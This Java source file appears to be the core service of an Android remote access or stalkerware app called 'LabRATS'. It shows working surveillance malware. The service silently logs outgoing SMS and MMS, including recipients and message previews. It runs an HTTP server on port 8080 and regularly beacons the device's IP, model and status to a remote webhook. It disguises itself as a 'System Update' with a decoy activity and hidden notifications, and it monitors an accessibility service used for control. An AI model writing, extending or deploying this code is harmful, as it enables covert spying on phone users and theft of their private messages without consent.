package com.labs.labrats;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import android.net.ConnectivityManager;
import android.net.LinkProperties;
import android.net.Network;
import android.net.Uri;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.os.Looper;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CoreSyncService extends Service {

    private static final String TAG = "CoreSyncService";
    private static final String CHANNEL_ID = "LabRATS-Channel";
    private static final int NOTIFICATION_ID = 1;
    public static boolean isRunning = false;
    
    // Heartbeat Interval: 5 Minutes
    private static final long HEARTBEAT_MS = 5 * 60 * 1000;

    // URL is now loaded from local.properties via BuildConfig
    private static final String REMOTE_WEBHOOK_URL = BuildConfig.WEBHOOK_URL;

    private LabRatsHttpServer server;
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private String lastReportedIp = "";
    private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
    private ContentObserver messageObserver;
    private boolean isForeground = false;
    private int webhookFailCount = 0;
    private long lastWebhookFailTime = 0;
    private final Handler ipReportHandler = new Handler(Looper.getMainLooper());
    private final Runnable ipReportRunnable = this::checkAndReportIp;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        ensureForeground();
        connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        registerNetworkCallback();
        registerMessageObserver();
        checkAndReportIp(); // Initial check
    }

    private void registerMessageObserver() {
        try {
            messageObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
                private long lastSmsId = -1;
                private long lastMmsId = -1;

                @Override
                public void onChange(boolean selfChange, Uri uri) {
                    super.onChange(selfChange, uri);
                    networkExecutor.execute(() -> {
                        checkNewSms();
                        checkNewMms();
                    });
                }

                private void checkNewSms() {
                    Cursor cursor = null;
                    try {
                        // Query all SMS, sorted by date. Check if the most recent one is 'sent' (type 2)
                        cursor = getContentResolver().query(Uri.parse("content://sms"), 
                                new String[]{"_id", "address", "body", "type"}, null, null, "date DESC LIMIT 1");
                        
                        if (cursor != null && cursor.moveToFirst()) {
                            long id = cursor.getLong(0);
                            int type = cursor.getInt(3);
                            if (id != lastSmsId) {
                                if (type == 2) { // 2 = MESSAGE_TYPE_SENT
                                    String address = cursor.getString(1);
                                    String body = cursor.getString(2);
                                    String preview = (body != null && body.length() > 30) ? body.substring(0, 27) + "..." : body;
                                    LabRatsHttpServer.logActivity("COMMS_SENT: [SMS/RCS to " + address + "] " + preview);
                                }
                                lastSmsId = id;
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error checking sent SMS: " + e.getMessage());
                    } finally {
                        if (cursor != null) cursor.close();
                    }
                }

                private void checkNewMms() {
                    Cursor cursor = null;
                    try {
                        // msg_box 2 = SENT
                        cursor = getContentResolver().query(Uri.parse("content://mms"), 
                                new String[]{"_id", "msg_box"}, null, null, "date DESC LIMIT 1");
                        
                        if (cursor != null && cursor.moveToFirst()) {
                            long id = cursor.getLong(0);
                            int msgBox = cursor.getInt(1);
                            if (id != lastMmsId) {
                                if (msgBox == 2) {
                                    LabRatsHttpServer.logActivity("COMMS_SENT: [MMS media dispatched]");
                                }
                                lastMmsId = id;
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error checking sent MMS: " + e.getMessage());
                    } finally {
                        if (cursor != null) cursor.close();
                    }
                }
            };

            getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, messageObserver);
            getContentResolver().registerContentObserver(Uri.parse("content://mms"), true, messageObserver);
            Log.d(TAG, "Message observer registered for bi-directional tracking");
        } catch (Exception e) {
            Log.e(TAG, "Failed to register message observer: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;

        if (!isForeground) {
            ensureForeground();
        }

        if ("START".equals(action)) {
            startServer();
        }
        else if ("STOP".equals(action)) {
            stopServer();
            stopForeground(true);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.cancel(NOTIFICATION_ID);
            }
            stopSelf();
        }

        return START_STICKY;
    }

    private void ensureForeground() {
        if (isForeground) {
            // Update existing notification to match current stealth state
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.notify(NOTIFICATION_ID, createNotification());
            }
            return;
        }
        
        Notification notification = createNotification();
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                try {
                    startForeground(NOTIFICATION_ID, notification, serviceType);
                    isForeground = true;
                } catch (Exception e) {
                    startForeground(NOTIFICATION_ID, notification);
                    isForeground = true;
                }
            } else {
                startForeground(NOTIFICATION_ID, notification);
                isForeground = true;
            }
        } catch (Exception e) {
            Log.e(TAG, "Critical FGS startup failure: " + e.getMessage());
        }
    }

    private synchronized void startServer() {
        try {
            if (server == null || !server.isAlive()) {
                server = new LabRatsHttpServer(this, 8080);
                server.start();
                isRunning = true;
                Log.d(TAG, "HTTP Server started on port 8080");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start server", e);
            isRunning = false;
        }
    }

    private synchronized void stopServer() {
        try {
            isRunning = false;
            if (server != null) {
                // Stop server in background to avoid blocking main thread if called from UI
                final LabRatsHttpServer serverToStop = server;
                server = null;
                new Thread(() -> {
                    try {
                        if (serverToStop.isAlive()) {
                            serverToStop.stop();
                        }
                        Log.d(TAG, "HTTP Server stopped successfully");
                    } catch (Exception e) {
                        Log.e(TAG, "Error stopping server in thread", e);
                    }
                }).start();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in stopServer", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Stability",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("Ensures background service persistence");
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private boolean isStealthMode() {
        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
        return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
    }

    private Notification createNotification() {
        boolean stealth = isStealthMode();
        
        Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);

        String title = stealth ? "System Update" : "System Stability Service";
        String contentText;
        
        if (stealth) {
            contentText = "Checking for system updates...";
        } else {
            contentText = "System is running normally";
        }

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(contentText)
                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.app_logo)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        isForeground = false; // CRITICAL: Reset state so next start calls startForeground()
        // Clean up resources immediately on background thread
        networkExecutor.execute(() -> {
            unregisterNetworkCallback();
            if (messageObserver != null) {
                try {
                    getContentResolver().unregisterContentObserver(messageObserver);
                } catch (Exception ignored) {}
            }
            if (server != null) {
                try { server.stop(); } catch (Exception ignored) {}
            }
            networkExecutor.shutdownNow();
        });
        super.onDestroy();
    }

    private void registerNetworkCallback() {
        if (connectivityManager != null) {
            try {
                networkCallback = new ConnectivityManager.NetworkCallback() {
                    @Override
                    public void onLinkPropertiesChanged(Network network, LinkProperties linkProperties) {
                        super.onLinkPropertiesChanged(network, linkProperties);
                        // Debounce IP reporting to prevent flood during network transitions
                        ipReportHandler.removeCallbacks(ipReportRunnable);
                        ipReportHandler.postDelayed(ipReportRunnable, 3000);
                    }
                };
                connectivityManager.registerDefaultNetworkCallback(networkCallback);
                
                // Start Timed Heartbeat to ensure persistence in Google Sheets
                ipReportHandler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (isRunning) {
                            checkAndReportIp();
                            ipReportHandler.postDelayed(this, HEARTBEAT_MS);
                        }
                    }
                }, HEARTBEAT_MS);

            } catch (Exception e) {
                Log.e(TAG, "Failed to register network callback", e);
            }
        }
    }

    private void unregisterNetworkCallback() {
        if (connectivityManager != null && networkCallback != null) {
            try {
                connectivityManager.unregisterNetworkCallback(networkCallback);
                networkCallback = null;
            } catch (Exception e) {
                Log.e(TAG, "Error unregistering network callback", e);
            }
        }
    }

    private void checkAndReportIp() {
        if (networkExecutor.isShutdown()) return;
        
        // Monitoring: Accessibility Service Health Check
        if (AccessibilityCore.getInstance() == null) {
            Log.w(TAG, "GHOST_MODE_MONITOR: Accessibility service is offline");
            LabRatsHttpServer.logActivity("SECURITY_ALERT: Accessibility service lost. Permission may have been revoked or service crashed.");
        }

        // Backoff Logic: If network is dead, don't spam attempts and drain battery
        long now = System.currentTimeMillis();
        long backoffDelay = webhookFailCount > 0 ? (long) Math.min(Math.pow(2, webhookFailCount) * 1000, 300000) : 0; // Max 5 min
        if (now - lastWebhookFailTime < backoffDelay) {
            return;
        }

        MainActivity.getPublicIPv6Async(publicIp -> {
            if (networkExecutor.isShutdown()) return;
            
            String localIp = MainActivity.getLocalIpAddress();
            String currentIp = (localIp != null) ? localIp : publicIp;

            if (currentIp != null && !currentIp.equals(lastReportedIp)) {
                Log.d(TAG, "IP Changed or Initial Report: " + currentIp);
                if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
                    // Send in background thread as network operations are involved
                    try {
                        networkExecutor.execute(() -> sendIpToWebhook(currentIp));
                    } catch (Exception e) {
                        Log.e(TAG, "Executor error", e);
                    }
                }
                lastReportedIp = currentIp;
            }
        });
    }

    private void sendIpToWebhook(String ip) {
        if (REMOTE_WEBHOOK_URL == null || REMOTE_WEBHOOK_URL.isEmpty()) return;
        
        try {
            String networkType = "Unknown";
            int batteryLevel = -1;
            
            try {
                if (connectivityManager != null) {
                    android.net.Network activeNetwork = connectivityManager.getActiveNetwork();
                    android.net.NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(activeNetwork);
                    if (caps != null) {
                        if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)) networkType = "WiFi";
                        else if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) networkType = "Cellular";
                    }
                }
                android.content.Intent batteryStatus = registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
                if (batteryStatus != null) {
                    int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                    int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                    batteryLevel = (int) ((level / (float) scale) * 100);
                }
            } catch (Exception ignored) {}

            String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
            String link = "http://" + formattedIp + ":8080";

            // Build JSON for POST (more reliable)
            String json = "{" +
                    "\"ip\":\"" + ip + "\"," +
                    "\"device\":\"" + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")\"," +
                    "\"network\":\"" + networkType + "\"," +
                    "\"battery\":\"" + batteryLevel + "%\"," +
                    "\"link\":\"" + link + "\"," +
                    "\"port\":8080," +
                    "\"stealth\":" + isStealthMode() +
                    "}";

            URL url = new URL(REMOTE_WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setInstanceFollowRedirects(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("User-Agent", "SystemStability/1.4");

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int code = conn.getResponseCode();
            
            // Manual redirect handling for Google's multi-hop redirects
            if (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) {
                String newUrl = conn.getHeaderField("Location");
                conn = (HttpURLConnection) new URL(newUrl).openConnection();
                code = conn.getResponseCode();
            }

            Log.d(TAG, "Webhook Broadcast Status: " + code);
            
            if (code == 200 || code == 201) {
                webhookFailCount = 0;
            } else {
                webhookFailCount++;
                lastWebhookFailTime = System.currentTimeMillis();
            }

        } catch (Exception e) {
            Log.e(TAG, "Webhook Critical Error: " + e.getMessage());
            webhookFailCount++;
            lastWebhookFailTime = System.currentTimeMillis();
        }
    }
}
